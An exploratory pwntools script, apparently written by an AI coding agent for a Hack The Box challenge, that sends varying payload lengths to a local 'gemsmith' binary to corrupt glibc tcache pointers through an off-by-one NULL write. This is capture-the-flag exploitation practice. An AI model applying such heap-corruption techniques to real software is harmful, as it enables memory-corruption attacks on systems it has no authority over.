#!/usr/bin/env python3
"""
Test tcache corruption via NULL write primitive
Author: Claude Code
Purpose: Systematically test heap corruption to find exploitable state
Created: 2025-11-23
Expected: Find a corruption that leads to arbitrary write
Result: [TBD]

Theory:
- GLIBC 2.27 has tcache
- free() puts chunks in tcache bins
- NULL write can corrupt tcache metadata (next pointer)
- Could get arbitrary allocation

Plan:
1. Allocchunk A
2. Free chunk A (goes to tcache)
3. Alloc with N bytes to NULL tcache->next at specific offset
4. Alloc again - might return corrupted pointer
"""

from pwn import *

context.log_level = 'debug'

def test_corruption(byte_count):
    """Test NULL write at specific byte count"""
    try:
        p = process('./gemsmith', timeout=3)

        # Op 1: Allocate chunk to put something in tcache
        p.sendlineafter(b'>', b'1')  # alloc
        p.sendlineafter(b':', b'0')  # index 0
        p.sendlineafter(b':', b'1056')  # max size
        p.sendlineafter(b':', b'AAAA')  # data

        # Op 2: Free it (goes to tcache)
        p.sendlineafter(b'>', b'2')  # delete
        p.sendlineafter(b':', b'0')  # index 0

        # Op 3: Allocate again with N bytes to corrupt tcache
        p.sendlineafter(b'>', b'1')  # alloc
        p.sendlineafter(b':', b'0')  # index 0
        p.sendlineafter(b':', b'1056')  # size
        payload = b'B' * byte_count  # NULL will be written at buf[byte_count]
        p.sendlineafter(b':', payload)

        # Op 4: Try to allocate again - might get corrupted address
        p.sendlineafter(b'>', b'1')  # alloc
        p.sendlineafter(b':', b'0')  # index 0
        p.sendlineafter(b':', b'100')  # size
        p.sendlineafter(b':', b'CCCC')  # data

        # Check output
        output = p.recvall(timeout=1)
        p.close()

        # Look for interesting behavior
        if b'HTB{' in output or b'flag' in output or b'success' not in output.lower():
            print(f"\n[!] INTERESTING at byte_count={byte_count}")
            print(output.decode('utf-8', errors='replace'))
            return True

    except Exception as e:
        return False

    return False

# Test a range of byte counts that might corrupt tcache
print("Testing tcache corruption with different byte counts...")
print("Looking for: crashes, unusual behavior, flags")

for i in range(0, 200, 8):  # Test in 8-byte increments (pointer size)
    if i % 40 == 0:
        print(f"Testing byte_count {i}...")
    if test_corruption(i):
        print(f"[!] Found interesting behavior at {i}")
        break
